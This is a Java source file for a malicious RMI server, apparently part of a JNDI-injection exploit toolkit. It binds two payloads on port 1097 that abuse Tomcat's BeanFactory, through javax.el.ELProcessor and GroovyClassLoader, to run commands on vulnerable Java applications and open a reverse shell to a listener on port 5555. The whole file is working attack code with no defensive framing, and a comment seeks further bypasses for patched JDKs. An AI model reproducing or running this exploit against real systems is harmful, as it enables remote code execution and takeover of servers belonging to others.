package payloads;

import com.sun.jndi.rmi.registry.*;

import java.rmi.RemoteException;
import java.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;

import org.apache.naming.factory.BeanFactory;


public class EvilRMIServer {

    public CommandGenerator commandGenerator;

    public EvilRMIServer(Listener listener){
        commandGenerator = new CommandGenerator(listener);
    }

    /*
     * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because javax.el.ELProcessor.
     */
    public ReferenceWrapper execByEL() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash','-c','%s']).start()\"" +
                        ")",
                commandGenerator.reverseShellCommand
        )));
        return new ReferenceWrapper(ref);
    }

    /*
     * Need : Tomcat and groovy in classpath.
     */
    public ReferenceWrapper execByGroovyParse() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={\n" +
                "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
                "})\n" +
                "def x\n", commandGenerator.getBase64CommandTpl());
        ref.add(new StringRefAddr("x",script));
        return new ReferenceWrapper(ref);
    }


    /**
     *   TODO: Need more methods to bypass in different java app builded by JDK 1.8.0_191+
     */


    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener("IP",5555));

        registry.bind("ExecByEL",evilRMIServer.execByEL());
        registry.bind("ExecByGroovyParse",evilRMIServer.execByGroovyParse());
    }
}